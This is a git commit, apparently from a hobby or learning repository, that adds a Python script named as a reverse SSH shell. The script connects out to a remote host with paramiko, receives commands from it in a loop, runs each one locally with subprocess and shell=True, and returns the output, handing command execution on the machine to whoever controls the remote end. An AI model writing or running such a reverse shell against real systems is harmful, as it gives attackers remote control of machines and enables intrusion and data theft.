6d7b05d9ec7b181552f83b0ad4effe7fcdfb3a11
Johnny McGee <johnnymcgee.dev@gmail.com>
2022-05-02 12:30:23 -0500

    Add reverse ssh shell script

---
+++ network_tools/ssh_rcmd.py
@@ -0,0 +1,39 @@
+import paramiko
+import shlex
+import subprocess
+
+from network_tools.ssh_parse import ssh_parse
+
+def ssh_command(ip, port, user, password):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, port=port, username=user, password=password)
+
+    ssh_session = client.get_transport().open_session()
+    if ssh_session.active:
+        ssh_session.send("ClientConnected")
+        print(ssh_session.recv(1024).decode())
+        while True:
+            command = ssh_session.recv(1024)
+            try:
+                cmd = command.decode()
+                if cmd == 'exit':
+                    client.close()
+                    break
+                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
+                ssh_session.send(cmd_output or 'ok')
+            except Exception as e:
+                ssh_session.send(str(e))
+        client.close()
+    return
+
+if __name__ == '__main__':
+    import sys
+    from ssh_parse import ssh_parse
+    ns = ssh_parse(sys.argv[1:])
+    ssh_command(
+        ip=ns.host,
+        port=ns.port,
+        user=ns.user,
+        password=ns.password,
+    )
